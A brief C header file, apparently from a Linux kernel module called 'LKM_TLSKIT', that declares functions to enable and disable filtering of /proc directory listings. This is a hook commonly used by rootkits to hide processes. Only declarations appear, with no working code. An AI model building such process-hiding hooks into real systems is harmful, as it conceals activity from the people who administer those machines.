#ifndef LKM_TLSKIT_PROC_HOOK_H
#define LKM_TLSKIT_PROC_HOOK_H

/**
 * Enable proc filters for /proc readdir
 * @return 0 on success, -1 else
 */
int enable_proc_filter(void);

/**
 * Disable proc filter
 */
void disable_proc_filter(void);

#endif //LKM_TLSKIT_PROC_HOOK_H
